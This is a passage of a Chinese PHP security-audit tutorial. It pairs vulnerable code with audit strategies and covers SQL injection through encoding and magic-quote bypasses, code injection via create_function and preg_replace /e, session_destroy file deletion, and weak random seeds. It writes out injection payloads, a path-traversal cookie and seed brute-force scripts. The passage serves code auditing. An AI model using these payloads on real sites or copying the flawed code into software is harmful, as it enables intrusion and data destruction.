<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>( $HTTP_RAW_POST_DATA ) ) &#123;</div><div class="line">	$HTTP_RAW_POST_DATA = file_get_contents( <span class="string">'php://input'</span> );</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>($HTTP_RAW_POST_DATA) )</div><div class="line">	$HTTP_RAW_POST_DATA = trim($HTTP_RAW_POST_DATA);</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略（数据流）</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：查找字符HTTP_RAW_POST_DATA或者php://input</td>
</tr>
</tbody>
</table>
<p><em>4) 数据库操作容易忘记’的地方如：in()/limit/order by/group by</em></p>
<p>如Discuz!&lt;5.0的pm.php：<br>​     </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">if(is_array($msgtobuddys)) &#123;</div><div class="line">	$msgto = array_merge($msgtobuddys, array($msgtoid));</div><div class="line">		......</div><div class="line">foreach($msgto as $uid) &#123;</div><div class="line">	$uids .= $comma.$uid;</div><div class="line">	$comma = ',';</div><div class="line">&#125;</div><div class="line">......</div><div class="line">$query = $db-&gt;query("SELECT m.username, mf.ignorepm FROM &#123;$tablepre&#125;members m</div><div class="line">	LEFT JOIN &#123;$tablepre&#125;memberfields mf USING(uid)</div><div class="line">	WHERE m.uid IN ($uids)");</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：查找数据库操作字符（select,update,insert等等）</td>
</tr>
</tbody>
</table>
<h3 id="变量的编码与解码"><a href="#变量的编码与解码" class="headerlink" title="变量的编码与解码"></a>变量的编码与解码</h3><p>一个WEB程序很多功能的实现都需要变量的编码解码，而且就在这一转一解的传递过程中就悄悄的绕过你的过滤的安全防线。</p>
<p>这个类型的主要函数有：</p>
<p><em>1) stripslashes() 这个其实就是一个decode-addslashes()</em></p>
<p><em>2) 其他字符串转换函数：</em></p>
<table>
<thead>
<tr>
<th style="text-align:left">函数</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">base64_decode</td>
<td style="text-align:left">对使用 MIME base64 编码的数据进行解码</td>
</tr>
<tr>
<td style="text-align:left">base64_encode</td>
<td style="text-align:left">使用 MIME base64 对数据进行编码</td>
</tr>
<tr>
<td style="text-align:left">rawurldecode</td>
<td style="text-align:left">对已编码的 URL 字符串进行解码</td>
</tr>
<tr>
<td style="text-align:left">rawurlencode</td>
<td style="text-align:left">按照 RFC 1738 对 URL 进行编码</td>
</tr>
<tr>
<td style="text-align:left">urldecode</td>
<td style="text-align:left">解码已编码的 URL 字符串</td>
</tr>
<tr>
<td style="text-align:left">urlencode</td>
<td style="text-align:left">编码 URL 字符串</td>
</tr>
</tbody>
</table>
<p><em>另外一个 unserialize/serialize</em></p>
<p><em>3) 字符集函数（GKB,UTF7/8…）如iconv()/mb_convert_encoding()等</em></p>
<p>目前很多漏洞挖掘者开始注意这一类型的漏洞了，如典型的urldecode：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$sql = <span class="string">"SELECT * FROM article WHERE articleid='"</span>.urldecode($_GET[id]).<span class="string">"'"</span>;</div></pre></td></tr></table></figure>
<p>当magic_quotes_gpc=on时，我们提交?id=%2527，得到sql语句为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM article WHERE articleid=<span class="string">''</span><span class="string">'</span></div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：查找对应的编码函数</td>
</tr>
</tbody>
</table>
<h3 id="二次攻击"><a href="#二次攻击" class="headerlink" title="二次攻击"></a>二次攻击</h3><p><em>详细见附录 [1]</em></p>
<p><em>1) 数据库出来的变量没有进行过滤</em></p>
<p><em>2) 数据库的转义符号：</em></p>
<ul>
<li>mysql/oracle转义符号同样是\（我们提交’通过魔术引号变化为\’，当我们update进入数据库时，通过转义变为’）</li>
<li>mssql的转义字符为’（所以我们提交’通过魔术引号变化为\’，mssql会把它当为一个字符串直接处理，所以魔术引号对于mssql的注射没有任何意义）</li>
</ul>
<p>从这里我们可以思考得到一个结论：一切进入函数的变量都是有害的，另外利用二次攻击我们可以实现一个webrootkit，把我们的恶意构造直接放到数据库里。我们应当把这样的代码看成一个vul？</p>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：通读代码</td>
</tr>
</tbody>
</table>
<h3 id="魔术引号带来的新的安全问题"><a href="#魔术引号带来的新的安全问题" class="headerlink" title="魔术引号带来的新的安全问题"></a>魔术引号带来的新的安全问题</h3><p>首先我们看下魔术引号的处理机制：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[\--&gt;\\,&apos;--&gt;\&apos;,&quot;--&gt;\&quot;,null--&gt;\0]</div></pre></td></tr></table></figure>
<p>这给我们引进了一个非常有用的符号“\”，“\”符号不仅仅是转义符号，在WIN系统下也是目录转跳的符号。这个特点可能导致php应用程序里产生非常有意思的漏洞：</p>
<p><em>1)得到原字符（’,\,”,null]）</em></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$order_sn=substr($_GET[<span class="string">'order_sn'</span>], <span class="number">1</span>);</div><div class="line"></div><div class="line"><span class="comment">//提交                 '</span></div><div class="line"><span class="comment">//魔术引号处理         \'</span></div><div class="line"><span class="comment">//substr               '</span></div><div class="line"></div><div class="line">$sql = <span class="string">"SELECT order_id, order_status, shipping_status, pay_status, "</span>.</div><div class="line">   <span class="string">" shipping_time, shipping_id, invoice_no, user_id "</span>.</div><div class="line">   <span class="string">" FROM "</span> . $ecs-&gt;table(<span class="string">'order_info'</span>).</div><div class="line">   <span class="string">" WHERE order_sn = '$order_sn' LIMIT 1"</span>;</div></pre></td></tr></table></figure>
<p><em>2)得到“\”字符</em></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$order_sn=substr($_GET[<span class="string">'order_sn'</span>], <span class="number">0</span>,<span class="number">1</span>);</div><div class="line"></div><div class="line"><span class="comment">//提交                 '</span></div><div class="line"><span class="comment">//魔术引号处理         \'</span></div><div class="line"><span class="comment">//substr               \    </span></div><div class="line"></div><div class="line">$sql = <span class="string">"SELECT order_id, order_status, shipping_status, pay_status, "</span>.</div><div class="line">   <span class="string">" shipping_time, shipping_id, invoice_no, user_id "</span>.</div><div class="line">   <span class="string">" FROM "</span> . $ecs-&gt;table(<span class="string">'order_info'</span>).</div><div class="line">   <span class="string">" WHERE order_sn = '$order_sn' and order_tn='"</span>.$_GET[<span class="string">'order_tn'</span>].<span class="string">"'"</span>;</div></pre></td></tr></table></figure>
<p>提交内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?order_sn=&apos;&amp;order_tn=%20and%201=1/*</div></pre></td></tr></table></figure>
<p>执行的SQL语句为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> order_id, order_status, shipping_status, pay_status, shipping_time, </div><div class="line">shipping_id, invoice_no, user_id <span class="keyword">FROM</span> order_info <span class="keyword">WHERE</span> order_sn = <span class="string">'\' and </span></div><div class="line">order_tn=' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">/*'</span></div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：查找字符串处理函数如substr或者通读代码</td>
</tr>
</tbody>
</table>
<h3 id="变量key与魔术引号"><a href="#变量key与魔术引号" class="headerlink" title="变量key与魔术引号"></a>变量key与魔术引号</h3><p>我们最在这一节的开头就提到了变量key，PHP的魔术引号对它有什么影响呢？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//key.php?aaaa'aaa=1&amp;bb'b=2 </span></div><div class="line"><span class="comment">//print_R($_GET); </span></div><div class="line"> <span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</div><div class="line">        &#123;</div><div class="line">        <span class="keyword">print</span> $key.<span class="string">"\n"</span>;</div><div class="line">        &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><em>1)当magic_quotes_gpc = On时，在php5.24下测试显示：</em></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">aaaa\'aaa</div><div class="line">bb\'b</div></pre></td></tr></table></figure>
<p>从上面结果可以看出来，在设置了magic_quotes_gpc = On下，变量key受魔术引号影响。但是在php4和php&lt;5.2.1的版本中，不处理数组第一维变量的key，测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//key.php?aaaa'aaa[bb']=1 </span></div><div class="line">print_R($_GET); </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>结果显示:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">Array</span> ( [aaaa<span class="string">'aaa] =&gt; Array ( [bb\'] =&gt; 1 ) )</span></div></pre></td></tr></table></figure>
<p>数组第一维变量的key不受魔术引号的影响。</p>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：php4和php&lt;5.2.1</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：通读代码</td>
</tr>
</tbody>
</table>
<p><em>2)当magic_quotes_gpc = Off时，在php5.24下测试显示：</em></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">aaaa'aaa</div><div class="line">bb'b</div></pre></td></tr></table></figure>
<p>对于magic_quotes_gpc = Off时所有的变量都是不安全的，考虑到这个，很多程序都通过addslashes等函数来实现魔术引号对变量的过滤，示例代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="comment">//keyvul.php?aaa'aa=1'</span></div><div class="line"><span class="comment">//magic_quotes_gpc = Off</span></div><div class="line"> <span class="keyword">if</span> (!get_magic_quotes_gpc())</div><div class="line">&#123;</div><div class="line"> $_GET  = addslashes_array($_GET);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_array</span><span class="params">($value)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">return</span> is_array($value) ? array_map(<span class="string">'addslashes_array'</span>, $value) : addslashes($value);</div><div class="line">&#125;</div><div class="line">print_R($_GET);</div><div class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">AS</span> $key =&gt; $value)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">print</span> $key;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>以上的代码看上去很完美，但是他这个代码里addslashes($value)只处理了变量的具体的值，但是没有处理变量本身的key，上面的代码显示结果如下：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Array</div><div class="line">(</div><div class="line">    [aaa'aa] =&gt; 1\'</div><div class="line">)</div><div class="line">aaa'aa</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：通读代码</td>
</tr>
</tbody>
</table>
<h3 id="代码注射"><a href="#代码注射" class="headerlink" title="代码注射"></a>代码注射</h3><hr>
<h3 id="PHP中可能导致代码注射的函数"><a href="#PHP中可能导致代码注射的函数" class="headerlink" title="PHP中可能导致代码注射的函数"></a>PHP中可能导致代码注射的函数</h3><p>很多人都知道eval、preg_replace+/e可以执行代码，但是不知道php还有很多的函数可以执行代码如：</p>
<table>
<thead>
<tr>
<th style="text-align:left">函数</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">assert()</td>
</tr>
<tr>
<td style="text-align:left">call_user_func()</td>
</tr>
<tr>
<td style="text-align:left">call_user_func_array()</td>
</tr>
<tr>
<td style="text-align:left">create_function()</td>
</tr>
<tr>
<td style="text-align:left">变量函数</td>
</tr>
</tbody>
</table>
<p>这里我们看看最近出现的几个关于create_function()代码执行漏洞的代码：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">//how to exp this code</div><div class="line">$sort_by=$_GET['sort_by'];</div><div class="line">$sorter='strnatcasecmp';</div><div class="line">$databases=array('test','test');</div><div class="line">$sort_function = '  return 1 * ' . $sorter . '($a["' . $sort_by . '"], $b["' . $sort_by . '"]);</div><div class="line">	      ';</div><div class="line">usort($databases, create_function('$a, $b', $sort_function));</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：查找对应函数（assert,call_user_func,call_user_func_array,create_function等）</td>
</tr>
</tbody>
</table>
<h3 id="变量函数与双引号"><a href="#变量函数与双引号" class="headerlink" title="变量函数与双引号"></a>变量函数与双引号</h3><p>对于单引号和双引号的区别，很多程序员深有体会，示例代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">echo</span> <span class="string">"$a\n"</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'$a\n'</span>;</div></pre></td></tr></table></figure>
<p>我们再看如下代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//how to exp this code</span></div><div class="line"><span class="keyword">if</span>($globals[<span class="string">'bbc_email'</span>])&#123;</div><div class="line"></div><div class="line">$text = preg_replace(</div><div class="line">		<span class="keyword">array</span>(<span class="string">"/\[email=(.*?)\](.*?)\[\/email\]/ies"</span>,</div><div class="line">				<span class="string">"/\[email\](.*?)\[\/email\]/ies"</span>),</div><div class="line">		<span class="keyword">array</span>(<span class="string">'check_email("$1", "$2")'</span>,</div><div class="line">				<span class="string">'check_email("$1", "$1")'</span>), $text);</div></pre></td></tr></table></figure>
<p>另外很多的应用程序都把变量用””存放在缓存文件或者config或者data文件里，这样很容易被人注射变量函数。</p>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：通读代码</td>
</tr>
</tbody>
</table>
<h3 id="PHP自身函数漏洞及缺陷"><a href="#PHP自身函数漏洞及缺陷" class="headerlink" title="PHP自身函数漏洞及缺陷"></a>PHP自身函数漏洞及缺陷</h3><hr>
<h3 id="PHP函数的溢出漏洞"><a href="#PHP函数的溢出漏洞" class="headerlink" title="PHP函数的溢出漏洞"></a>PHP函数的溢出漏洞</h3><p>大家还记得Stefan Esser大牛的Month of PHP Bugs（MOPB见附录 [2]）项目么，其中比较有名的要算是unserialize()，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . <span class="string">'_data'</span>]);</div></pre></td></tr></table></figure>
<p>在以往的PHP版本里，很多函数都曾经出现过溢出漏洞，所以我们在审计应用程序漏洞的时候不要忘记了测试目标使用的PHP版本信息。</p>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：对应fix的版本</td>
</tr>
<tr>
<td style="text-align:left">系统要求：</td>
</tr>
<tr>
<td style="text-align:left">审计策略：查找对应函数名</td>
</tr>
</tbody>
</table>
<h3 id="PHP函数的其他漏洞"><a href="#PHP函数的其他漏洞" class="headerlink" title="PHP函数的其他漏洞"></a>PHP函数的其他漏洞</h3><p>Stefan Esser大牛发现的漏洞：unset()–Zend_Hash_Del_Key_Or_Index Vulnerability<br>​<br>比如phpwind早期的serarch.php里的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">unset</span>($uids);</div><div class="line">......</div><div class="line">$query=$db-&gt;query(<span class="string">"SELECT uid FROM pw_members WHERE username LIKE '$pwuser'"</span>);</div><div class="line"><span class="keyword">while</span>($member=$db-&gt;fetch_array($query))&#123;</div><div class="line">	$uids .= $member[<span class="string">'uid'</span>].<span class="string">','</span>;</div><div class="line">&#125;</div><div class="line">$uids ? $uids=substr($uids,<span class="number">0</span>,<span class="number">-1</span>) : $sqlwhere.=<span class="string">' AND 0 '</span>;</div><div class="line">........</div><div class="line">$query = $db-&gt;query(<span class="string">"SELECT DISTINCT t.tid FROM $sqltable WHERE $sqlwhere $orderby $limit"</span>);</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：php4&lt;4.3 php5&lt;5.14</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：查找unset</td>
</tr>
</tbody>
</table>
<h3 id="session-destroy-删除文件漏洞"><a href="#session-destroy-删除文件漏洞" class="headerlink" title="session_destroy()删除文件漏洞"></a>session_destroy()删除文件漏洞</h3><p><em>测试PHP版本：5.1.2</em><br>​<br>这个漏洞是几年前朋友saiy发现的，session_destroy()函数的功能是删除session文件，很多web应用程序的logout的功能都直接调用这个函数删除session，但是这个函数在一些老的版本中缺少过滤导致可以删除任意文件。测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line"><span class="comment">//val.php   </span></div><div class="line">session_save_path(<span class="string">'./'</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">'del'</span>]) &#123;</div><div class="line">	session_unset();</div><div class="line">	session_destroy();</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	$_SESSION[<span class="string">'hei'</span>]=<span class="number">1</span>;</div><div class="line">	<span class="keyword">echo</span>(session_id());</div><div class="line">	print_r($_SESSION);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>当我们提交构造cookie:PHPSESSID=/../1.php，相当于unlink(‘sess<code>_</code>/../1.php’)这样就通过注射../转跳目录删除任意文件了。很多著名的程序某些版本都受影响如phpmyadmin，sablog，phpwind3等等。</p>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：具体不详</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：查找session_destroy</td>
</tr>
</tbody>
</table>
<h3 id="随机函数"><a href="#随机函数" class="headerlink" title="随机函数"></a>随机函数</h3><p><em>1) rand() VS mt_rand()</em></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//on windows</span></div><div class="line"><span class="keyword">print</span> mt_getrandmax(); <span class="comment">//2147483647</span></div><div class="line"><span class="keyword">print</span> getrandmax();<span class="comment">// 32767</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>可以看出rand()最大的随机数是32767，这个很容易被我们暴力破解。 </p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$a= md5(rand());</div><div class="line">for($i=0;$i&lt;=32767;$i++)&#123;</div><div class="line">  if(md5($i) ==$a ) &#123;</div><div class="line">   print $i."--&gt;ok!! |</div><div class="line">| ";exit;</div><div class="line">   &#125;else &#123; print $i." |</div><div class="line">| ";&#125;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>当我们的程序使用rand处理session时，攻击者很容易暴力破解出你的session，但是对于mt_rand是很难单纯的暴力的。</p>
<table>
<thead>
<tr>
<th style="text-align:left"><em>漏洞审计策略</em></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PHP版本要求：无</td>
</tr>
<tr>
<td style="text-align:left">系统要求：无</td>
</tr>
<tr>
<td style="text-align:left">审计策略：查找rand</td>
</tr>
</tbody>
</table>
<p><em>2) mt_srand()/srand()-weak seeding（by Stefan Esser）</em></p>
<p>看php手册里的描述：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mt_srand</div><div class="line">(PHP <span class="number">3</span> &gt;= <span class="number">3.0</span><span class="number">.6</span>, PHP <span class="number">4</span>, PHP <span class="number">5</span>)</div><div class="line"></div><div class="line">mt_srand -- 播下一个更好的随机数发生器种子</div><div class="line">说明</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">mt_srand</span> <span class="params">( <span class="keyword">int</span> seed )</span></span></div></pre></td></tr></table></figure>
<p>用 seed 来给随机数发生器播种。从 PHP 4.2.0 版开始，seed 参数变为可选项，当该项为空时，会被设为随时数。 </p>
<p>例子 1. mt_srand() 范例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// seed with microseconds</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_seed</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">list</span>($usec, $sec) = explode(<span class="string">' '</span>, microtime());</div><div class="line">    <span class="keyword">return</span> (float) $sec + ((float) $usec * <span class="number">100000</span>);</div><div class="line">&#125;</div><div class="line">mt_srand(make_seed());</div><div class="line">$randval = mt_rand();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>_注: 自 PHP 4.2.0 起，不再需要用 srand() 或 mt<em>srand() 函数给随机数发生器播种，现已自动完成。</em></p>
<p>php从4.2.0开始实现了自动播种，但是为了兼容，后来使用类似于这样的代码播种：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mt_srand ((<span class="keyword">double</span>) microtime() * <span class="number">1000000</span>)</div></pre></td></tr></table></figure>
<p>但是使用(double)microtime()<code>*</code>1000000类似的代码seed是比较脆弱的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>&lt;(<span class="keyword">double</span>) microtime()&lt;<span class="number">1</span> ---&gt; <span class="number">0</span>&lt;(<span class="keyword">double</span>) microtime()* <span class="number">1000000</span>&lt;<span class="number">1000000</span></div></pre></td></tr></table></figure>
<p>那么很容易暴力破解,测试代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/////////////////</span></div><div class="line"><span class="comment">//&gt;php rand.php</span></div><div class="line"><span class="comment">//828682</span></div><div class="line"><span class="comment">//828682</span></div><div class="line"><span class="comment">////////////////</span></div><div class="line">ini_set(<span class="string">"max_execution_time"</span>,<span class="number">0</span>);</div><div class="line">$time=(double) microtime()* <span class="number">1000000</span>;</div><div class="line"><span class="keyword">print</span> $time.<span class="string">"\n"</span>;</div><div class="line">mt_srand ($time);</div><div class="line"></div><div class="line">$search_id = mt_rand();</div><div class="line">$seed = search_seed($search_id);</div><div class="line"><span class="keyword">print</span> $seed;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">search_seed</span><span class="params">($rand_num)</span> </span>&#123;</div><div class="line">$max = <span class="number">1000000</span>;</div><div class="line"><span class="keyword">for</span>($seed=<span class="number">0</span>;$seed&lt;=$max;$seed++)&#123;</div><div class="line">	mt_srand($seed);</div><div class="line">	$key = mt_rand();</div><div class="line">	<span class="keyword">if</span>($key==$rand_num) <span class="keyword">return</span> $seed;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>从上面的代码实现了对seed的破解，另外根据Stefan Esser的分析seed还根据进程变化而变化，换句话来说同一个进程里的seed是相同的。 然后同一个seed每次mt_rand的值都是特定的。如下图：</p>
<table>
<thead>
<tr>
<th style="text-align:left">例A</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><em>seed-A</em></td>
</tr>
<tr>
<td style="text-align:left">mt_rand-A-1</td>
</tr>
<tr>
<td style="text-align:left">mt_rand-A-2</td>
</tr>
<tr>
